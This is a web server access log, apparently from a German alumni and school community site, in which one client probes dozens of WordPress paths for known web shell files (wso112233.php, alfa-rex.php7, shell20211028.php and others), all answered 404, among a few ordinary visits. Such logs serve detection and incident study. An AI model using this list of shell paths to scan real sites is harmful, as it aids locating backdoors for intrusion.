user;timestamp;referer;target;method;status
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:39;/;/wp-content/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:40;/;/wp-includes/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:40;/;/wp-admin/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:41;/;/wp-content/themes/shell20211028.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:41;/;/.well-known/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:41;/;/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:41;/;/.well-knownold/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:42;/;/.well-known/pkivalidation/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:43;/;/wp-content/plugins/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:44;/;/wp-content/uploads/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:44;/;/wp-content/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:45;/;/wp-includes/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:45;/;/wp-admin/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:45;/;/wp-content/themes/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:46;/;/dropdown.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:46;/;/wp-content/dropdown.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:47;/;/wp-includes/dropdown.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:47;/;/wp-admin/dropdown.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:47;/;/alfa-rex.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:48;/;/alfanew.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:48;/;/wp-content/plugins/Cache/Cache.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:48;/;/wp-admin/js/widgets/about.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:49;/;/wp-p.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:49;/;/wp-admin/repeater.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:49;/;/wp-includes/repeater.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:49;/;/wp-content/repeater.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:50;/;/wsoyanz.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:50;/;/yanz.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:50;/;/wp-admin/js/about.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:51;/;/wp-content/plugins/seoo/wsoyanz.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:51;/;/wp-content/plugins/seoo/wsoyanz1.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:52;/;/cache-compat.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:52;/;/ajax-actions.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:52;/;/wp-admin/ajax-actions.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:53;/;/wp-consar.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:53;/;/repeater.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:53;/;/admin-post.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:54;/;/wp-admin/maint/maint/ajax-actions.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:54;/;/wp-admin/css/index.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:55;/;/about.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:55;/;/about.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:55;/;/alfanew.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:56;/;/adminfuns.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:56;/;/ebs.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:57;/;/ws.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:57;/;/alfanew2.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:58;/;/alfa-rex2.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:25:59;/;/ioxi-rex4.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:26:00;/;/wp-content/plugins/seoo/alfa-ioxi.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:26:00;/;/wp-content/plugins/classic-editor/wp-login.php;GET;404
344b78f04664b06009d09d6b2095627ffca28a2df667a467875a5dd36fd4711b;2025-11-22 20:30:54;;/gruppen/hobby/reisen;GET;302
344b78f04664b06009d09d6b2095627ffca28a2df667a467875a5dd36fd4711b;2025-11-22 20:30:58;/gruppen/hobby/reisen;/gruppen;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-22 20:32:07;/themen/details/was-kommt-nach-dem-abitur;/themen/details/bucher-auf-dem-abstellgleis;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 20:32:56;/;/;PROPFIND;405
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-22 20:33:31;/personen/alumni/schule/0351;/personen/alumni/schule/170690;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-22 20:34:57;/gruppen/hobby/malen-und-zeichnen;/gruppen/hobby/musikproduktion;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-22 20:34:59;/gruppen/hobby/malen-und-zeichnen;/gruppen;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-22 20:36:20;/personen/alumni/schule/0351;/aktuelles/meldungen;GET;200
94d10329701f972a4e9560982dcbf915d8d5021b7b3e7844d5e51d93ed97c11c;2025-11-22 20:39:41;;/personen/alumni/schule/HS002;GET;200
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:12;/;/xmrlpc.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:13;/;/abcd.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:14;/;/admin.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:14;/;/info.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:15;/;/edit.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:15;/;/moon.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:16;/;/wp-content/index.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:16;/;/classwithtostring.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:16;/;/file4.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:17;/;/ioxi-o.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:17;/;/wp-good.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:18;/;/ds.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:18;/;/bolt.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:18;/;/new.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:19;/;/.well-known/index.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:19;/;/wp-includes/Requests/Text/index.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:19;/;/wp-includes/Requests/Text/admin.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:20;/;/.well-known/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:20;/;/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:21;/;/.well-knownold/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:21;/;/.well-known/pkivalidation/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:21;/;/wp-content/plugins/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:22;/;/wp-content/uploads/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:22;/;/wp-content/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:23;/;/wp-includes/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:23;/;/wp-admin/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:23;/;/wp-content/themes/wso112233.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:24;/;/.well-known/shell20211028.php;GET;404
